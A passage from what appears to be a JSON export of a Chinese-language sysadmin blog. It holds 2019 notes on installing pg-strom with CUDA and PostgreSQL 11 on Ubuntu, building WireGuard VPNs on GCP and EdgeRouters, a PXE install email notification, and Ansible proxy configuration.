CUDA Driver Version = 10.1, CUDA Runtime Version = 10.1, NumDevs = 1 Result = PASS 到這邊， CUDA 也安裝完成，再來是簡單的 postgresql 11\n安裝 postgresql 11 步驟差不多，就是新增repository，然後選擇要安裝的套件，不過套件的選擇和平常安裝postgresql 不太一樣\nsudo apt install wget ca-certificates wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add - sudo sh -c \u0026#39;echo \u0026#34;deb http://apt.postgresql.org/pub/repos/apt/ `lsb_release -cs`-pgdg main\u0026#34; \u0026gt;\u0026gt; /etc/apt/sources.list.d/pgdg.list\u0026#39; sudo apt update sudo apt install postgresql-client-11 postgresql-11 postgresql-server-dev-11 postgresql-common libicu-dev 跑完之後，就直接啟動 postgresql service 就可以了\n再來是最麻煩的 pgstorm\npgstorm 話說，這軟體到底叫啥名字？ pgstrom , pg-strom ? 看起來就像是拼錯字啊！ =.=\nhttps://github.com/heterodb/pg-strom\n先 git clone 回來，然後make、make install\n講是很簡單，但是一開始碰到很多問題，有去github 跟開發團隊回報，幸好有回覆我..\n總之，目前在ubuntu 18.04 + postgresql-11 的環境下編譯是沒有問題了\nUPDATE 今天拿到一張 GTX 1050 ti ，想說終於可以來測試看看 pg_strom 了\n不過發現在ubuntu 底下，照著這篇操作還是會有問題\n在做完git clone 要 make 之前，要先執行底下兩行指令\n其中的 11 是 postgresql 版本，要依照自己安裝的版本做調整\nsudo ln -snf /usr/lib/postgresql/11/lib/libpgcommon.a /usr/lib/x86_64-linux-gnu/libpgcommon.a sudo ln -snf /usr/lib/postgresql/11/lib/libpgport.a /usr/lib/x86_64-linux-gnu/libpgport.a 接著再去 make 就沒問題了\ngit clone https://github.com/heterodb/pg-strom.git cd pg-strom make \u0026amp;\u0026amp; sudo make install 再來設定一下 postgresql\npostgresql 相關設定 需要修改一下postgresql.conf，來指定載入 pgstrom 的 library\n官方是這麼說的\nPG-Strom module must be loaded on startup of the postmaster process by the shared_preload_libraries. Unable to load it on demand. Therefore, you must add the configuration below. 修改 /etc/postgresql/11/main/postgresql.conf 加入一行\nshared_preload_libraries = \u0026#39;$libdir/pg_strom\u0026#39; 然後還有其他三個要修改，不過這個不改不會影響pgstrom 的啟動\n看狀況要不要修改吧\nmax_worker_processes = 100 shared_buffers = 10GB work_mem = 1GB 修改完後，重新啟動 postgresql service 有沒有很感動！？我終於可以享受用GPU跑SQL Query 的快感啦！！！\n咦？？等等，為什麼postgresql service 沒起來！？\n看一下 /var/log/syslog\nAug 20 14:23:43 hqdc032 postgresql@11-main[11801]: Error: /usr/lib/postgresql/11/bin/pg_ctl /usr/lib/postgresql/11/bin/pg_ctl start -D /var/lib/postgresql/11/main -l /var/log/postgresql/postgresql-11-main.log -s -o -c config_file=\u0026#34;/etc/postgresql/11/main/postgresql.conf\u0026#34; exited with status 1: Aug 20 14:23:43 hqdc032 postgresql@11-main[11801]: 2019-08-20 14:23:43.538 CST [11806] LOG: PG-Strom version 2.2 built for PostgreSQL 11 Aug 20 14:23:43 hqdc032 postgresql@11-main[11801]: 2019-08-20 14:23:43.565 CST [11806] LOG: PG-Strom: GPU0 GeForce GT 720 - CC 3.5 is not supported Aug 20 14:23:43 hqdc032 postgresql@11-main[11801]: 2019-08-20 14:23:43.565 CST [11806] FATAL: PG-Strom: no supported GPU devices found Aug 20 14:23:43 hqdc032 postgresql@11-main[11801]: 2019-08-20 14:23:43.565 CST [11806] LOG: database system is shut down Aug 20 14:23:43 hqdc032 postgresql@11-main[11801]: pg_ctl: could not start server Aug 20 14:23:43 hqdc032 postgresql@11-main[11801]: Examine the log output. Aug 20 14:23:43 hqdc032 systemd[1]: postgresql@11-main.service: Can\u0026#39;t open PID file /run/postgresql/11-main.pid (yet?) after start: No such file or directory Aug 20 14:23:43 hqdc032 systemd[1]: postgresql@11-main.service: Failed with result \u0026#39;protocol\u0026#39;. Aug 20 14:23:43 hqdc032 systemd[1]: Failed to start PostgreSQL Cluster 11-main. 啊幹！pg-strom 不支援這張GT 720啦！\nhttps://github.com/heterodb/pg-strom/wiki/001:-GPU-Availability-Matrix\n簡單說，就是至少從 GTX 1080 起跳，其他都不用想了\n幹，花了兩天的時間在弄這東西，結果明明一開始就應該要先檢查的相容列表卻沒有檢查\u0026hellip;\n好了，現在就看准不准我買一張 GTX 1080 來測試了\u0026hellip;.\n只是這價格嘛\u0026hellip;嗯咳，不是我該煩惱的問題了..\n","date":"2019-08-20T14:51:54+08:00","permalink":"https://h.cowbay.org/post/install-nvidia-driver-cuda-pgstrom-in-ubuntu-1804/","title":"[筆記] 在ubuntu 18.04 下安裝nvidia 顯示卡驅動程式以及 pgstrom / Install Nvidia Driver Cuda Pgstrom in Ubuntu 1804"},{"content":"最近一直在玩 wireguard ，先前把各個分公司和總部的VPN 改用 wireguard 建立\n想說再打個VPN tunnel 來當跳板連 ptt 好了\n因為wireguard 建立很簡單，而且又可以指定想要繞出去的路由，不會影響原本的網路環境\n本來是在vultr 的VPS上面建立這個tunnel\n但是那台VPS連去ptt 很頓，卡卡的\n所以改用google cloud platform 的free tier 來做\n反正只是拿來當跳板，不會有什麼流量、運算產生，可以一直保持免費的狀態\nGCP的申請、設定就不多說了\n這次碰到的怪異現象是當wireguard 都已經設定好，client 也都連上了之後\n會發生client 開不了 www.google.com.tw / youtube / google map 等等google 服務的狀況\nVPN確定是通的，我可以在client 這邊連上其他網站，但就是google的服務開不了\n後來不知道是怎麼樣，突然靈機一動，因為一開始設定server/peer 都是用 10.0.0.x/24 的IP\n想說會不會是因為這個也是google cloud platform 預設的LAN IP 網段，所以沒辦法繞出去\n看一下設定，確認一下這個想法對不對，果然是這樣沒錯\n解決方法很簡單，要不修改VPS的內部IP，要不修改wireguard的設定\n當然我是選擇改wireguard ，因為簡單嘛！\n修改後的configuration 長這樣\n[Interface] Address = 192.168.10.1/24 PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o ens4 -j MASQUERADE PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o ens4 -j MASQUERADE ListenPort = 12000 PrivateKey = E..........................E #OFFICE DESKTOP [Peer] PublicKey = W...........................W AllowedIPs = 192.168.10.2/32 #ANDROID [Peer] PublicKey = w............................w AllowedIPs = 192.168.10.3/32 #HOME [Peer] PublicKey = 2.........................................2 AllowedIPs = 192.168.10.4/32 重起wireguard (或者說重起 wg0 這個interface)之後，client 開google 網頁就正常了\nclient 這邊，也是簡單設定一下，把要透過跳板出去的IP 改走wireguard 出去\n底下這個，就是把往台大(140.112.0.0) 和 term.ptt.cc(104.31.0.0)的封包改走wireguard\n[Interface] PrivateKey = e............................e Address = 192.168.10.2/24 DNS = 8.8.8.8 MTU = 1420 [Peer] PublicKey = q...........................q Endpoint = public_ip_of_gcp:12000 AllowedIPs = 140.112.0.0/16,104.31.0.0/16,192.168.10.1/32 PersistentKeepalive = 25 然後看一下路由對不對\n2019-08-16 10:34:21 [cch@hq34 ~]$ traceroute term.ptt.cc traceroute to term.ptt.cc (104.31.231.9), 30 hops max, 60 byte packets 1 192.168.10.1 (192.168.10.1) 191.826 ms 192.556 ms 192.678 ms 2 * * * 3 * * * 4 * * * 5 104.31.231.9 (104.31.231.9) 203.918 ms 203.982 ms 203.979 ms 2019-08-16 10:34:33 [cch@hq34 ~]$ 果然是走wireguard (192.168.10.1) 出去 ，跳板成功！\n","date":"2019-08-16T10:18:06+08:00","permalink":"https://h.cowbay.org/post/do-no-use-10-0-0-0-private-ipaddr-in-gcp/","title":"[筆記] 在gcp 中用wireguard建立VPN時，不要用 10.0.0.0/16 網段/Do No Use 10 0 0 0 Private Ipaddr in GCP"},{"content":"因為實在受夠了現在用的 openwrt + strongswan 建立 IPSec VPN\n雖然說其實沒有什麼不好，但是畢竟不是我建立的，而當初的文件也都不見了\n完全沒辦法了解當時設計的邏輯，造成後續debug 困難\n可以想像一下，一台VPN router ping 不到remote、ping不到internet、甚至ping不到自己 是要怎麼debug !?(翻桌\n之前買了兩台edgerouter X 拿來玩了一下 wireguard，感覺還不錯，不過只有測試到點對點\n這次試試看躲在gateway後面，看看能不能建立多點的VPN環境\nevery node enable ip_forward edit /etc/sysctl.conf add below line in the end of the file\nnet.ipv4.ip_forward=1 install wireguard sudo apt-get install libmnl-dev linux-headers-$(uname -r) build-essential make git libelf-dev git clone https://git.zx2c4.com/WireGuard cd WireGuard/src/ make sudo make install or via apt\nsudo add-apt-repository ppa:wireguard/wireguard sudo apt install wireguard create wireguard service file add /etc/systemd/system/multi-user.target.wants/wg-quick@wg0.service\n[Unit] Description=WireGuard via wg-quick(8) for %I After=network-online.target nss-lookup.target Wants=network-online.target nss-lookup.target Documentation=man:wg-quick(8) Documentation=man:wg(8) Documentation=https://www.wireguard.com/ Documentation=https://www.wireguard.com/quickstart/ Documentation=https://git.zx2c4.com/WireGuard/about/src/tools/man/wg-quick.8 Documentation=https://git.zx2c4.com/WireGuard/about/src/tools/man/wg.8 [Service] Type=oneshot RemainAfterExit=yes ExecStart=/usr/bin/wg-quick up %i ExecStop=/usr/bin/wg-quick down %i Environment=WG_ENDPOINT_RESOLUTION_RETRIES=infinity [Install] WantedBy=multi-user.target Node A create wireguard private/public key wg genkey \u0026gt; /etc/wireguard/private cat /etc/wireguard/private | wg pubkey \u0026gt; /etc/wireguard/public /etc/wireguard/wg0.conf watch the interface name , must meets the interface name in system , ens18 is the default value of my test VM\n[Interface] Address = 10.0.0.40/24 ListenPort = 12000 PrivateKey = private key of node A PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o ens18 -j MASQUERADE PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o ens18 -j MASQUERADE [Peer] PublicKey = public key of node B AllowedIPs = 10.0.0.28/32,192.168.28.0/24 Endpoint = 2.2.2.2:12000 PersistentKeepalive = 15 [Peer] PublicKey = public key of node C AllowedIPs = 10.0.0.80/32,192.168.80.0/24 Endpoint = 3.3.3.3:12000 PersistentKeepalive = 15 Node B (peer 1) create wireguard private/public key wg genkey \u0026gt; /etc/wireguard/private cat /etc/wireguard/private | wg pubkey \u0026gt; /etc/wireguard/public /etc/wireguard/wg0.conf watch the interface name , must meets the interface name in system , ens18 is the default value of my test VM\n[Interface] ListenPort = 12000 PrivateKey = private key of node B Address = 10.0.0.28/24 PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o ens18 -j MASQUERADE PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o ens18 -j MASQUERADE [Peer] PublicKey = public key of node A AllowedIPs = 10.0.0.40/32,192.168.40.0/24 Endpoint = 1.1.1.1:12000 PersistentKeepalive = 15 [Peer] PublicKey = public key of node C AllowedIPs = 10.0.0.80/32,192.168.80.0/24 Endpoint = 3.3.3.3:12000 PersistentKeepalive = 15 Node C (peer 2) create wireguard private/public key wg genkey \u0026gt; /etc/wireguard/private cat /etc/wireguard/private | wg pubkey \u0026gt; /etc/wireguard/public /etc/wireguard/wg0.conf watch the interface name , must meets the interface name in system , ens18 is the default value of my test VM\n[Interface] ListenPort = 12000 PrivateKey = private key of node C Address = 10.0.0.80/24 PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o ens18 -j MASQUERADE PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o ens18 -j MASQUERADE [Peer] PublicKey = public key of node A AllowedIPs = 10.0.0.40/32,192.168.40.0/24 Endpoint = 1.1.1.1:12000 PersistentKeepalive = 15 [Peer] PublicKey = public key of node B AllowedIPs = 10.0.0.28/32,192.168.28.0/24 Endpoint = 2.2.2.2:12000 PersistentKeepalive = 15 Test Reboot all nodes , check if interface wg0 up by default or not\nuse command wg show to check status\nfor example , this is result of wg show in node C\nroot@sdvpn:~# wg show interface: wg0 public key: public key of Node C private key: (hidden) listening port: 12000 peer: public key of node A endpoint: 1.1.1.1:12000 allowed ips: 10.0.0.40/32, 192.168.40.0/24 latest handshake: 49 seconds ago transfer: 9.77 KiB received, 9.73 KiB sent persistent keepalive: every 15 seconds peer: public key of node B endpoint: 2.2.2.2:12000 allowed ips: 10.0.0.28/32, 192.168.28.0/24 latest handshake: 2 minutes, 8 seconds ago transfer: 3.93 KiB received, 7.89 KiB sent persistent keepalive: every 15 seconds and the ping test\nroot@sdvpn:~# ping -c 1 192.168.40.40 PING 192.168.40.40 (192.168.40.40) 56(84) bytes of data. 64 bytes from 192.168.40.40: icmp_seq=1 ttl=63 time=21.2 ms --- 192.168.40.40 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 21.204/21.204/21.204/0.000 ms root@sdvpn:~# ping -c 1 192.168.28.40 PING 192.168.28.40 (192.168.28.40) 56(84) bytes of data. 64 bytes from 192.168.28.40: icmp_seq=1 ttl=63 time=24.2 ms --- 192.168.28.40 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 24.208/24.208/24.208/0.000 ms root@sdvpn:~# and the traceroute\nroot@sdvpn:~# traceroute 192.168.40.40 traceroute to 192.168.40.40 (192.168.40.40), 30 hops max, 60 byte packets 1 10.0.0.40 (10.0.0.40) 21.349 ms 22.337 ms 22.576 ms 2 tcpc040.abc.com (192.168.40.40) 22.565 ms 22.551 ms 22.541 ms root@sdvpn:~# traceroute 192.168.28.40 traceroute to 192.168.28.40 (192.168.28.40), 30 hops max, 60 byte packets 1 10.0.0.28 (10.0.0.28) 25.481 ms 30.117 ms 32.086 ms 2 dcpc040.abc.com (192.168.28.40) 33.811 ms 35.360 ms 36.769 ms root@sdvpn:~# additonal steps enable firewall NAT in each nodes router not necessary , but if the wireguard node is behind a NAT router , then must enable NAT for wireguard\n1.1.1.1 is the WAN IP of the router , and 192.168.80.4 is the wireguard LAN ip, I map port 224 to ssh and 12000 for wireguard\niptables -t nat -A PREROUTING -i eth1 -d 1.1.1.1 -p tcp --dport 224 -j DNAT --to-destination 192.168.80.4:22 iptables -t nat -A PREROUTING -i eth1 -d 1.1.1.1 -p udp --dport 12000 -j DNAT --to-destination 192.168.80.4:12000 summary if want to add more nodes into VPN , just follow the logic and steps.\ncreate private/public key create wg0.conf add new nodes in every other nodes wg0.conf as peer for route , must add remote network in AllowedIPs check ip_forward is enable I think the postup haws no effect here , because the firewall service was disable by default , and if I use iptables -F to flush all firewall rules , the network still remain in connected. need to create an ansible playbook for this Update strongswan IPSEC VS wireguard wireguard almost twice faster than strongswan\niperf test with wireguard VPN 30 seconds benchmark\nroot@sdvpn:~# iperf -c 192.168.40.7 -t 30 ------------------------------------------------------------ Client connecting to 192.168.40.7, TCP port 5001 TCP window size: 85.0 KByte (default) ------------------------------------------------------------ [ 3] local 10.0.0.80 port 48270 connected with 192.168.40.7 port 5001 [ ID] Interval Transfer Bandwidth [ 3] 0.0-30.1 sec 65.1 MBytes 18.1 Mbits/sec root@sdvpn:~# iperf test with strongswan VPN\nroot@sdvpn:~# iperf -c 192.168.40.7 -t 30 ------------------------------------------------------------ Client connecting to 192.168.40.7, TCP port 5001 TCP window size: 85.0 KByte (default) ------------------------------------------------------------ [ 3] local 192.168.80.4 port 57806 connected with 192.168.40.7 port 5001 [ ID] Interval Transfer Bandwidth [ 3] 0.0-30.1 sec 35.6 MBytes 9.94 Mbits/sec root@sdvpn:~# ","date":"2019-08-13T15:50:31+08:00","permalink":"https://h.cowbay.org/post/multiple-site-to-site-vpn-using-wireguard/","title":"[筆記] 透過 wireguard 建立多點 site to site VPN / Multiple Site to Site VPN Using Wireguard"},{"content":"之前總部和分公司之間 是用buffalo 的小AP 灌 openwrt\n然後用strongswan 來打 IPSEC site to site VPN\nconfig 看起來不是很難 (只是看起來)\n但是實際上已經找不到當初的文件\n所以要維護很困難(光那些RSA KEY 就不知道為何、如何產生)\n後來採購了兩台edgerouter X 做測試\n也用openvpn 成功的建立了 site to site VPN\n本來想說 openvpn 已經夠簡單了\n今天看到文章說用wireguard 可以更簡單\n於是研究了一下，發現還真的很簡單！\ndownload deb for your edgerouter go check https://github.com/Lochnair/vyatta-wireguard first curl -L -O https://github.com/Lochnair/vyatta-wireguard/releases/download/0.0.20190702-1/wireguard-v2.0-e50-0.0.20190702-1.deb dpkg -i wireguard-v2.0-e50-0.0.20190702-1.deb process log\nroot@ubnt112:~# dpkg -i wireguard-v2.0-e50-0.0.20190702-1.deb Selecting previously unselected package wireguard. (Reading database ... 37024 files and directories currently installed.) Preparing to unpack wireguard-v2.0-e50-0.0.20190702-1.deb ... Adding \u0026#39;diversion of /opt/vyatta/share/perl5/Vyatta/Interface.pm to /opt/vyatta/share/perl5/Vyatta/Interface.pm.vyatta by wireguard\u0026#39; Adding \u0026#39;diversion of /opt/vyatta/share/vyatta-cfg/templates/firewall/options/mss-clamp/interface-type/node.def to /opt/vyatta/share/vyatta-cfg/templates/firewall/options/mss-clamp/interface-type/node.def.vyatta by wireguard\u0026#39; Unpacking wireguard (0.0.20190702-1) ... Setting up wireguard (0.0.20190702-1) ... generate private/public key in left router wg genkey | tee /dev/tty | wg pubkey first one in private key and the next one is public key of this router\nQGAUHJSDFAdkfjskdjo1DP8H1NuLTrXH6kue6kphaQk/iAkc= ta+GJCWNUHJSDFAdkfjskdjnkppY5FpsIs3a8dc4oArtV8FU= configure left site edgerouter configure set interfaces wireguard wg0 address 192.168.99.1/24 set interfaces wireguard wg0 listen-port 51820 set interfaces wireguard wg0 route-allowed-ips true ### paster your private key which was just been generate set interfaces wireguard wg0 private-key QGAUHJSDFAdkfjskdjo1DP8H1NuLTrXH6kue6kphaQk/iAkc= generate private/public key in right router wg genkey | tee /dev/tty | wg pubkey first one in private key and the next one is public key of this router\nUBzmPabcdefghijklmnopqrlbi5tnsQqjoJ4+H4= tmlrPSabcdefghijklmnopqrIb1Enzf+108yotkhdRmk= configure right site edgerouter configure set interfaces wireguard wg0 address 192.168.99.2/24 set interfaces wireguard wg0 listen-port 51820 set interfaces wireguard wg0 route-allowed-ips true ### paster your private key which was just been generate set interfaces wireguard wg0 private-key UBzmPabcdefghijklmnopqrlbi5tnsQqjoJ4+H4= now , configure both router to talk to each other\nconfigure in left router ### use the right router public key here set interfaces wireguard wg0 peer tmlrPSabcdefghijklmnopqrIb1Enzf+108yotkhdRmk= allowed-ips 192.168.99.0/16 set interfaces wireguard wg0 peer tmlrPSabcdefghijklmnopqrIb1Enzf+108yotkhdRmk= endpoint 222.222.222.222:51820 set interfaces wireguard wg0 peer tmlrPSabcdefghijklmnopqrIb1Enzf+108yotkhdRmk= persistent-keepalive 15 configre in right router ### use the left router public key here set interfaces wireguard wg0 peer ta+GJCWNUHJSDFAdkfjskdjnkppY5FpsIs3a8dc4oArtV8FU= allowed-ips 192.168.99.0/16 set interfaces wireguard wg0 peer ta+GJCWNUHJSDFAdkfjskdjnkppY5FpsIs3a8dc4oArtV8FU= endpoint 111.111.111.111:51280 set interfaces wireguard wg0 peer ta+GJCWNUHJSDFAdkfjskdjnkppY5FpsIs3a8dc4oArtV8FU= persistent-keepalive 15 configure firewall policy in left site router ### change 40 to your own rule number set firewall name WAN_LOCAL rule 40 source port 51820 set firewall name WAN_LOCAL rule 40 destination port 51820 configure firewall policy in right site router ### change 40 to your own rule number set firewall name WAN_LOCAL rule 40 source port 51820 set firewall name WAN_LOCAL rule 40 destination port 51820 then finally , commit these changes on both side router\ncommit ### and save if you want save oops , one more step , add static route manually add static route in left router ip route add 192.168.111.0/24 dev wg0 manually add static route in right router ip route add 192.168.112.0/24 dev wg0 check wireguard status in both router left root@ubnt112:~# sudo wg interface: wg0 public key: ta+GJCWNUHJSDFAdkfjskdjnkppY5FpsIs3a8dc4oArtV8FU= private key: (hidden) listening port: 51820 peer: tmlrPSabcdefghijklmnopqrIb1Enzf+108yotkhdRmk= endpoint: 111.111.111.111:51820 allowed ips: 192.168.99.0/16 latest handshake: 1 minute, 19 seconds ago transfer: 7.49 MiB received, 195.86 MiB sent persistent keepalive: every 15 seconds root@ubnt112:~# right interface: wg0 public key: tmlrPSabcdefghijklmnopqrIb1Enzf+108yotkhdRmk= private key: (hidden) listening port: 51820 peer: ta+GJCWNUHJSDFAdkfjskdjnkppY5FpsIs3a8dc4oArtV8FU= endpoint: 222.222.222.222:51820 allowed ips: 192.168.99.0/16 latest handshake: 1 minute, 48 seconds ago transfer: 195.60 MiB received, 8.07 MiB sent persistent keepalive: every 15 seconds root@ubnt111:~# need more edgerouter and lease line to try multiple site to site VPN using wideguard need to study about allowed-ips sort out scripts left router wg genkey | tee /dev/tty | wg pubkey QGAUHJSDFAdkfjskdjo1DP8H1NuLTrXH6kue6kphaQk/iAkc= ta+GJCWNUHJSDFAdkfjskdjnkppY5FpsIs3a8dc4oArtV8FU= configure set interfaces wireguard wg0 address 192.168.99.1/24 set interfaces wireguard wg0 listen-port 51820 set interfaces wireguard wg0 route-allowed-ips true set interfaces wireguard wg0 private-key QGAUHJSDFAdkfjskdjo1DP8H1NuLTrXH6kue6kphaQk/iAkc= set interfaces wireguard wg0 peer tmlrPSabcdefghijklmnopqrIb1Enzf+108yotkhdRmk= allowed-ips 192.168.99.0/16 set interfaces wireguard wg0 peer tmlrPSabcdefghijklmnopqrIb1Enzf+108yotkhdRmk= endpoint 222.222.222.222:51820 set interfaces wireguard wg0 peer tmlrPSabcdefghijklmnopqrIb1Enzf+108yotkhdRmk= persistent-keepalive 15 set firewall name WAN_LOCAL rule 40 action accept set firewall name WAN_LOCAL rule 40 protocol udp set firewall name WAN_LOCAL rule 40 source port 51820 set firewall name WAN_LOCAL rule 40 destination port 51820 commit save ip route add 192.168.111.0/24 dev wg0 right router wg genkey | tee /dev/tty | wg pubkey UBzmPabcdefghijklmnopqrlbi5tnsQqjoJ4+H4= tmlrPSabcdefghijklmnopqrIb1Enzf+108yotkhdRmk= configure set interfaces wireguard wg0 address 192.168.99.2/24 set interfaces wireguard wg0 listen-port 51820 set interfaces wireguard wg0 route-allowed-ips true set interfaces wireguard wg0 private-key UBzmPabcdefghijklmnopqrlbi5tnsQqjoJ4+H4= set interfaces wireguard wg0 peer ta+GJCWNUHJSDFAdkfjskdjnkppY5FpsIs3a8dc4oArtV8FU= allowed-ips 192.168.99.0/16 set interfaces wireguard wg0 peer ta+GJCWNUHJSDFAdkfjskdjnkppY5FpsIs3a8dc4oArtV8FU= endpoint 111.111.111.111:51280 set interfaces wireguard wg0 peer ta+GJCWNUHJSDFAdkfjskdjnkppY5FpsIs3a8dc4oArtV8FU= persistent-keepalive 15 set firewall name WAN_LOCAL rule 40 action accept set firewall name WAN_LOCAL rule 40 protocol udp set firewall name WAN_LOCAL rule 40 source port 51820 set firewall name WAN_LOCAL rule 40 destination port 51820 commit save ip route add 192.168.112.0/24 dev wg0 ","date":"2019-08-06T17:14:17+08:00","permalink":"https://h.cowbay.org/post/site-to-site-vpn-using-wireguard-in-two-edgerouters/","title":"[筆記] 在edgerouter上用wireguard 建立site to site VPN / Site to Site Vpn Using Wireguard in Two Edgerouters"},{"content":"最近有個任務，需要大量安裝client\n想用PXE來處理，只要user開機按F12(acer 桌機) 選擇PXE Boot\n然後選擇OS版本，就可以自動進行安裝\n安裝完成後，會自動重新開機，接著就用ansible來做user環境設定\nPXE的部份本來是沒有什麼問題，自動安裝系統的部份都做好了\n可是因為這次的量比較多，想說讓每一台在完成PXE安裝後的第一次重開機\n就送出一封郵件來通知我，說已經完成安裝，可以執行ansible 了\n看似很簡單的一件事情，卻搞了我兩天\u0026hellip;.\n本來在 preseed 檔案中，就有 preseed/late_command 可以用\n但是測試了很多遍，才終於找到正確的語法\nd-i preseed/late_command \\ in-target apt-file update; \\ in-target passwd --expire root ;\\ in-target /bin/sh -c \u0026#39;echo \u0026#34;hostname|mail -s pxe_install_complete admin@abc.com\u0026#34; \u0026gt; /etc/rc.local\u0026#39; 這會把目標主機上的 /etc/rc.local 的內容改成只有一行\nhostname|mail -s pxe_install_complete admin@abc.com 這樣就可以讓主機在完成系統安裝後，第一次重新開機時，送出郵件通知\n可是呢，因為ubuntu 開機時，本來就會去執行 /etc/rc.local\n所以「每次」開機後，都會送出郵件通知\n但是我只想要接到一次通知就好了啊\n有文章說可以用 s6-svc 來處理\n不過我沒弄懂怎麼用\n另一個是用ansible來處理\n又或者是，讓這個指令在送出郵件後，「自我還原」或者「自我更新」\n自我還原的部份可以這樣做\nhostname|mail -s pxe_install_complete admin@abc.com echo \u0026#34;#!/bin/sh -e\\nexit 0\u0026#34; \u0026gt; /etc/rc.local 所以preseed 那邊的語法就要改一下\nin-target /bin/sh -c \u0026#39;echo \u0026#34;hostname|mail -s pxe_install_complete admin@abc.com;\\\u0026#34;exit 0\\\u0026#34; \u0026gt; /etc/rc.local\u0026#39; 這樣一來，在送出郵件後，/etc/rc.local 的檔案內容會被恢復成只有底下這一行\nexit 0 暫時先這樣子處理\n更新 因為直接把 /etc/rc.local 的內容改掉，實在讓我有點不放心\n所以想到一個方式，先備份 /etc/rc.local 然後加入我要的功能\n因為我只需要它跑一次就好，所以就可以在最後面加入還原剛剛複製的備份檔案\n簡單說在preseed 檔案中 改成這樣\nd-i preseed/late_command \\ in-target apt-file update; \\ in-target passwd --expire root ;\\ in-target cp /etc/rc.local /etc/rc.local.bak ;\\ in-target /bin/sh -c \u0026#39;echo \u0026#34;hostname|mail -s pxe_install_complete admin@abc.com\u0026#34; \u0026gt; /etc/rc.local\u0026#39; ;\\ in-target /bin/sh -c \u0026#39;echo \u0026#34;cp /etc/rc.local.bak /etc/rc.local\u0026#34; \u0026gt;\u0026gt; /etc/rc.local\u0026#39; 在開機之後，會先送出郵件通知，然後會把剛剛複製的備份覆蓋回來，變成原本的 rc.local\n這樣就不會有什麼問題了\n","date":"2019-07-31T11:06:33+08:00","permalink":"https://h.cowbay.org/post/send-mail-to-notify-after-pxe-install/","title":"[筆記] 用pxe 安裝系統，完成後送出郵件通知 / send mail notification after pxe install"},{"content":"因為工作上的需要，要修改client端的 /etc/environment 檔案\n在有權限使用proxy 服務的user的環境中，加入proxy 的設定\n原本的清單中，有host/user/ip 這幾個值可以拿來判斷\nproxy server 那邊是採用ip 來控制，所以這邊也跟著用 ip 來判斷要不要修改 /etc/environment\n原本的想法是這樣\n在playbook中，有兩個 task\n當user ip (ansible_default_ipv4.address) 在清單內 ( {{ iuser_list }} )時\n會去加入一些文字到 /etc/environment\n反之，則取消這一段文字\n- name: get internet user list set_fact: iuser_list: \u0026#34;{{ ch[\u0026#39;client_hosts\u0026#39;][\u0026#39;abc.com\u0026#39;] |selectattr(\u0026#39;iuser\u0026#39;, \u0026#39;defined\u0026#39;)| list }}\u0026#34; - name: add proxy to /etc/environment blockinfile: path: /etc/environment marker: \u0026#34;#{mark} ANSIBLE MANAGED BLOCK#\u0026#34; block: | all_proxy=\u0026#34;{{ proxy_env }}\u0026#34; http_proxy=\u0026#34;{{ proxy_env }}\u0026#34; https_proxy=\u0026#34;{{ proxy_env }}\u0026#34; no_proxy=\u0026#34;localhost,127.0.0.1,192.168.1.1/16,.abc.com,.def.com\u0026#34; when: item.ipv4 == ansible_default_ipv4.address with_items: \u0026#34;{{ iuser_list }}\u0026#34; # remove proxy when user not in iuser_list - name: removeproxy from /etc/environment blockinfile: path: /etc/environment marker: \u0026#34;#{mark} ANSIBLE MANAGED BLOCK#\u0026#34; block: \u0026#34;\u0026#34; when: ansible_default_ipv4.address not in \u0026#34;item.ipv4\u0026#34; with_items: \u0026#34;{{ iuser_list }}\u0026#34; 先做出一個可以上internet 的 user list\n內容大概長這樣\nhwaddress: f4:4d:30:45:ee:6f\u0026#39;, host: pc114\u0026#39;, ipv4: 192.168.1.114\u0026#39;, user: [liwa\u0026#39;], iuser: True hwaddress: f4:4d:30:45:ef:aa\u0026#39;, host: pc120\u0026#39;, ipv4: 192.168.1.120\u0026#39;, user: [wany\u0026#39;], iuser: True 然後判斷當client ip 在這個清單中時，就去修改，反之就刪除修改的部份\n有權限上internet的電腦在一開始跑就卡關了，這兩個task 都會被執行到\n不應該是這樣才對呀，光看when 條件，會覺得這兩個條件應該是互斥的，怎麼會同時成立呢？\n後來想想\n在第一個task中，因為是用 item.ipv4 == ansible_default_ipv4.address 去做比對，所以很正常的一直比對到有符合的資料，然後開始進行task\n但是在第二個task中，用的是ansible_default_ipv4.address not in item.ipv4 ，於是第一筆資料就符合條件，於是也開始執行task\n在邏輯上，這樣的判斷沒有錯，錯的是我那打結的頭腦\u0026hellip;.\n那怎麼解決呢？\n把原本清單中的 ipv4 另外整理成一個list ，然後再去比對client ip 有沒有在這個list 中\n就會變成這樣\n- name: get internet user ip list set_fact: iuser_ip_list: \u0026#34;{{ ch[\u0026#39;client_hosts\u0026#39;][\u0026#39;kw.com\u0026#39;] |selectattr(\u0026#39;iuser\u0026#39;, \u0026#39;defined\u0026#39;)| map(attribute=\u0026#39;ipv4\u0026#39;)|list }}\u0026#34; - name: add proxy to /etc/environment blockinfile: path: /etc/environment marker: \u0026#34;#{mark} ANSIBLE MANAGED BLOCK#\u0026#34; block: | all_proxy=\u0026#34;{{ proxy_env }}\u0026#34; http_proxy=\u0026#34;{{ proxy_env }}\u0026#34; https_proxy=\u0026#34;{{ proxy_env }}\u0026#34; 